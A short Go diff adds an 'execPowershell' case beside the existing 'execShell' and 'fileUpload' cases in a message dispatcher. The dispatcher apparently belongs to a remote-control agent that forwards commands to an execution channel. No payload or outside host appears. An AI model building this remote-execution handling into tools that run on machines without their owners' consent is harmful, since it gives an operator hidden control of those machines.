@@ -28,6 +28,9 @@ func SettleMsg(message string) {
 	case "execShell":
 		setchannel.CmdMsgChan <- message
 		return
+	case "execPowershell":
+		setchannel.CmdMsgChan <- message
+		return
 	case "fileUpload":
 		setchannel.CmdMsgChan <- message
 		return
